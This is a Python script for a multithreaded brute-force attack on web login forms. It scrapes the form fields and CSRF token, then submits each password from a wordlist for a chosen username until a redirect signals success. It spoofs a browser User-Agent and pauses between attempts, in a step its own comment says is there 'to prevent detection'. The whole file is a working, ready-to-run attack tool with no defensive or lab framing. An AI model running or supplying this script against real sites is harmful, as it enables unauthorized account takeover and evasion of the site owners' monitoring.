import argparse
import requests
import threading
import time
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup

# Function to parse arguments
def parse_arguments():
    parser = argparse.ArgumentParser(description="Advanced HTTP/HTTPS Brute Force Login")
    parser.add_argument("-l", "--username", required=True, help="Username to use for login attempts")
    parser.add_argument("-u", "--url", required=True, help="URL of the login page (e.g., http://example.com/login)")
    parser.add_argument("--redirect", required=True, help="URL to redirect to, indicating a successful login")
    parser.add_argument("wordlist", help="Path to the wordlist file containing passwords")
    parser.add_argument("--threads", type=int, default=1, help="Number of threads to use (default: 1)")
    return parser.parse_args()

# Function to extract the form and CSRF token from the login page
def get_login_form_details(url):
    session = requests.Session()
    response = session.get(url)

    if response.status_code != 200:
        print("Failed to retrieve the login page.")
        return None, None, None, None, None

    soup = BeautifulSoup(response.text, 'html.parser')
    form = soup.find('form')
    if not form:
        print("No form found on the login page.")
        return None, None, None, None, None

    action_url = form.get('action', url)  # Default to the current URL if no action attribute is present
    action_url = urljoin(url, action_url)  # Ensure it's an absolute URL
    method = form.get('method', 'POST').upper()

    username_field, password_field, csrf_token = None, None, None
    for input_tag in form.find_all('input'):
        input_name = input_tag.get('name', '').lower()
        if 'user' in input_name or 'login' in input_name:
            username_field = input_name
        elif 'pass' in input_name or 'password' in input_name:
            password_field = input_name
        if 'csrf' in input_name:
            csrf_token = input_tag.get('value', '')

    return action_url, method, username_field, password_field, csrf_token

# Brute-force function for a single password
def attempt_login(session, action_url, method, username_field, password_field, csrf_token, username, password, headers, redirect_url):
    payload = {
        username_field: username,
        password_field: password
    }
    if csrf_token:
        payload['csrf_token'] = csrf_token

    try:
        if method == 'POST':
            response = session.post(action_url, data=payload, headers=headers, allow_redirects=True)
        else:
            response = session.get(action_url, params=payload, headers=headers, allow_redirects=True)

        if response.url == redirect_url:
            print(f"[SUCCESS] Login successful with password: {password}")
            return True
        else:
            print(f"[FAILURE] Username: {username}, Password: {password}")
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Request error: {e}")

    return False

# Thread worker
def worker(username, url, redirect_url, wordlist, headers, action_url, method, username_field, password_field, csrf_token):
    session = requests.Session()
    for password in wordlist:
        success = attempt_login(session, action_url, method, username_field, password_field, csrf_token, username, password, headers, redirect_url)
        if success:
            break
        time.sleep(0.5)  # Add delay to prevent detection

# Main function to execute the script
def main():
    args = parse_arguments()

    with open(args.wordlist, 'r') as wordlist_file:
        passwords = [line.strip() for line in wordlist_file]

    action_url, method, username_field, password_field, csrf_token = get_login_form_details(args.url)
    if not action_url:
        return

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    threads = []
    chunk_size = len(passwords) // args.threads
    for i in range(args.threads):
        start = i * chunk_size
        end = start + chunk_size if i < args.threads - 1 else len(passwords)
        thread = threading.Thread(target=worker, args=(
            args.username, args.url, args.redirect, passwords[start:end], headers,
            action_url, method, username_field, password_field, csrf_token
        ))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
